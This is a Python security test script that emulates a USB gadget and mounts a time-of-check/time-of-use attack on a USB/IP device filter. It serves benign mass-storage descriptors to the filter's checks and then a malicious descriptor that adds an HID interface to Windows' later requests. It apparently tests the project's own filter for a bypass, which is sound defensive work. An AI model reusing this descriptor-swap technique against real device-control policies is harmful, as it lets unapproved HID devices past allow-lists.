#!/usr/bin/env python3
"""Attack #10: descriptor TOCTOU.

Serve a BENIGN configuration descriptor to the known pre-export/filter fetch
sequence, then a MALICIOUS one (adds an HID interface) to every later request
from Windows' enumeration.

Run on the server (root), bound to a software UDC, then export the UDC over
USB/IP and attach from Windows with a policy that allows ONLY mass_storage.

Desired outcome: Windows must NOT end up with an HID interface the filter never
evaluated. If it does, that is a real bypass -> file it.
"""

from __future__ import annotations

import os

import usb_descriptors as d
from _raw_gadget import GET_DESCRIPTOR, ControlRequest
from _runner import run_profile

VID, PID = 0x16C0, 0x03F0
BENIGN_CONFIG_RESPONSES = int(os.environ.get("BENIGN_CONFIG_RESPONSES", "4"))

_config_request_count = 0


def on_control(req: ControlRequest) -> bytes | None:
    global _config_request_count

    if req.bRequest == GET_DESCRIPTOR and req.descriptor_type == d.DT_DEVICE:
        # Device class 0x00 => "defined at interface level" so the filter relies
        # on the (lied-about) configuration descriptor.
        return d.device_descriptor(vid=VID, pid=PID, b_device_class=0x00)

    if req.bRequest == GET_DESCRIPTOR and req.descriptor_type == d.DT_CONFIG:
        _config_request_count += 1
        benign = d.benign_mass_storage_config()

        # On the dummy_hcd + usbip-host lane, the Linux host stack enumerates
        # once before export (header + full body), and device_filter.cpp then
        # fetches its own snapshot during Windows attach (header + full body).
        # All of those responses must be benign; mutating during either pair
        # makes the local host or the filter see HID and deny normally instead
        # of exercising the filter-to-Windows TOCTOU boundary.
        if _config_request_count <= BENIGN_CONFIG_RESPONSES:
            expected_len = 9 if _config_request_count % 2 == 1 else len(benign)
            phase = "header" if expected_len == 9 else "full config"
            if req.wLength != expected_len:
                raise RuntimeError(
                    f"expected benign configuration {phase} request of "
                    f"{expected_len} bytes at fetch #{_config_request_count}, "
                    f"got {req.wLength}")
            print(f"[toctou] serving BENIGN config {phase} to fetch "
                  f"#{_config_request_count}")
            return benign

        print(f"[toctou] serving MALICIOUS config (ms+hid) to Windows fetch "
              f"#{_config_request_count}")
        return d.malicious_ms_plus_hid_config()

    if req.bRequest == GET_DESCRIPTOR and req.descriptor_type == d.DT_STRING:
        return d.string_descriptor(req.descriptor_index)

    return None  # STALL everything else


if __name__ == "__main__":
    run_profile("toctou", on_control, vid=VID, pid=PID)
